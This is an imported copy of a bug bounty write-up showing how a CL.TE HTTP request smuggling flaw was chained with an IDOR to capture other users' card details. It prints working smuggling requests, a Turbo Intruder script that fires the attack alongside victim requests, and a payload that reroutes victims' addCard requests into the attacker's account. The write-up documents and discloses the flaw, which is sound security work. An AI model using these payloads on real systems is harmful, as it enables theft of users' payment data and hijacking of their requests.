---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-05_http-request-smuggling-idor.md
original_filename: 2019-12-05_http-request-smuggling-idor.md
title: HTTP Request Smuggling + IDOR
category: documents
detected_topics:
- idor
- access-control
- command-injection
- race-condition
- api-security
- supply-chain
tags:
- imported
- documents
- idor
- access-control
- command-injection
- race-condition
- api-security
- supply-chain
language: en
raw_sha256: fb73ba08842387ed4b701a2df311a618def6b85c332ee5dfaefbdb3f92a0cb0c
text_sha256: b06f297a0e9d7ff7e2b8de1e2737847653a7dc47395879b119de21c2cdb7c12a
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# HTTP Request Smuggling + IDOR

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-05_http-request-smuggling-idor.md
- Source Type: markdown
- Detected Topics: idor, access-control, command-injection, race-condition, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `fb73ba08842387ed4b701a2df311a618def6b85c332ee5dfaefbdb3f92a0cb0c`
- Text SHA256: `b06f297a0e9d7ff7e2b8de1e2737847653a7dc47395879b119de21c2cdb7c12a`


## Content

---
title: "HTTP Request Smuggling + IDOR"
page_title: "HTTP Request Smuggling + IDOR - hipotermia"
url: "https://hipotermia.pw/bb/http-desync-idor"
final_url: "https://hipotermia.pw/bb/http-desync-idor"
authors: ["hipotermia (@_hipotermia_)"]
bugs: ["HTTP request smuggling", "IDOR"]
publication_date: "2019-12-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4907
---

# HTTP Request Smuggling + IDOR

[Tweet](https://twitter.com/share?ref_src=twsrc%5Etfw)

05/12/2019

**HTTP Request Smuggling** or **HTTP Desync** is one of the trendy vulnerabilities of the moment and one of my favorites, because it allows you to greatly increase the severity of most common bugs. Here, in this first of a series of HTTP Request Smuggling chained vulnerabilities I've found, I'll explain how I chained it with a inoffensive **IDOR** to retrieve some user highly confidential information.

Everything is redacted and highly modified to not disclose this bug bounty program's information.

* * *

All started thanks to [Burp's Request Smuggler plugin](https://github.com/PortSwigger/http-request-smuggler) with which I detected a possible vulnerable `CL.TE` endpoint.

![](/static/img/bb/http-desync-idor/0.png)

I like to create my own pocs to confirm if an endpoint is indeed vulnerable, so I used the following crafted request to test this `CL.TE`.
  
  
  POST / HTTP/1.1
  Transfer-Encoding: chunked
  Host: xxx.com
  Content-Length: 35
  Foo: bar
  
  0
  
  GET /admin7 HTTP/1.1
  X-Foo: k
  

What I try to achieve with this request is:

  * The front-end uses the `Content-Length` header, forwarding the whole request.
  * The back-end uses `Transfer-Encoding: chunked` processing only the `0` which means end of the request.
  * The remaining part (`GET /admin7`...) is processed with the next request the back-end receives. (I used `/admin7` knowing it returned a `302` code, to make it easier to identify).

In the following pictures it's possible to see the expected behavior.

Since the back-end uses `Transfer-Encoding: chunked` it will only answer till the `0` returning a `404` (the default code for a `POST` to `/`) and leaving the remaining part unprocessed.

![](/static/img/bb/http-desync-idor/3.png)

When the next request arrives (`GET /`), that remaining part is processed with it, modifying the other user's request.

![](/static/img/bb/http-desync-idor/4.png)

This can be achieved with the following **Turbo Intruder** script.
  
  
  def queueRequests(target, wordlists):
  
  engine = RequestEngine(endpoint=target.endpoint,
  concurrentConnections=5,
  requestsPerConnection=1,
  resumeSSL=False,
  timeout=10,
  pipeline=False,
  maxRetriesPerRequest=0,
  engine=Engine.THREADED,
  )
  engine.start()
  
  attack = '''POST / HTTP/1.1
  Transfer-Encoding: chunked
  Host: xxx.com
  Content-Length: 35
  Foo: bar
  
  0
  
  GET /admin7 HTTP/1.1
  X-Foo: k'''
  
  engine.queue(attack)
  
  victim = '''GET / HTTP/1.1
  Host: xxx.com
  
  '''
  for i in range(14):
  engine.queue(victim)
  time.sleep(0.05)
  
  def handleResponse(req, interesting):
  table.add(req)
  

We can see how the malicious request is sent first and then, 14 simple `GET` to `/` which return a `404`.

![](/static/img/bb/http-desync-idor/1.png)

But since this system is vulnerable, one of those simple `GET` was internally modified by our malicious request and returns a different response (the `302` which corresponds to `/admin7`).

![](/static/img/bb/http-desync-idor/2.png)

What I usually try in these situations is changing the `Host` header in order to redirect the victim to a different website which will be already considered as a high vulnerability.
  
  
  POST / HTTP/1.1
  Transfer-Encoding: chunked
  Host: xxx.com
  Content-Length: 55
  Foo: bar
  
  0
  
  POST /admin7 HTTP/1.1
  Host: **malicious.com**
  Content-Length: 100
  
  kk
  

Unfortunately this nor any request trying to append the victim's req in the body of my target request didn't work, which made me think that maybe an internal header was being set internally and only requests with that header were processed.

I tried to find an endpoint which would allow me to reflect internal headers, but I couldn't find any, instead I found something better, a hidden **swagger** with all user endpoint's documentation.

I started testing that API, I was able to create my own user and found that some endpoints were potentially vulnerable to **IDOR**.

For example, this endpoint (`/addCard`) which allowed to add a credit card to your account (in reality it wasn't credit cards, but this is easier to understand). You can see how any authorization header nor session cookie is being used, only the user id is needed (`675ygtyt675erp`) to add a new card.
  
  
  POST /addCard/675ygtyt675erp HTTP/1.1
  Host: xx.com
  Content-Type: application/json
  Content-Length: 83
  
  {"name": "Name","card": "12345", "exp": "00/00", "cvv": "000"}
  

But just this behavior shouldn't be considered a real vulnerability, since why would someone add a valid credit card to another user?

Here comes how with HTTP Request Smuggling we can turn this into an **IDOR on steroids**.
  
  
  POST / HTTP/1.1
  Transfer-Encoding: chunked
  Host: xxx.com
  Content-Length: 70
  Foo: bar
  
  0
  
  POST /addCard/675ygtyt675erp HTTP/1.1
  x-ff: kk
  

Using that request what I'm doing is modifying the path of the next request and if that next request happens to be an `addCard` request, the card will be added to an account under my control (`675ygtyt675erp`) being able to retrieve that information.

![](/static/img/bb/http-desync-idor/5.png)
